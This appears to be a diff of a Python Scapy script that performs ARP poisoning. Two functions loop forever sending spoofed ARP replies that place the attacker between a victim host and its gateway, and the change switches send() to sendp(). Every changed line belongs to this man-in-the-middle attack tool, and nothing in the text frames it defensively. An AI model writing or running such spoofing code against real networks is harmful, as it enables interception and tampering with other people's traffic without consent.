@@ -28,7 +28,7 @@ def v_poison():
 	v = ARP(pdst=VIP, psrc=GW)
 	while True:
 		try:
-			send(v, verbose=0, inter=2, loop=1)
+			sendp(v, verbose=0, inter=2, loop=1)
 		except KeyboardInterupt:
 			sys.exit(1)
 
@@ -36,7 +36,7 @@ def gw_poison():
 	gw = ARP(pdst=GW, psrc=VIP)
 	while True:
 		try:
-			send(gw, verbose=0, inter=2, loop=1)
+			sendp(gw, verbose=0, inter=2, loop=1)
 		except KeyboardInterupt:
 			sys.exit(1)
 
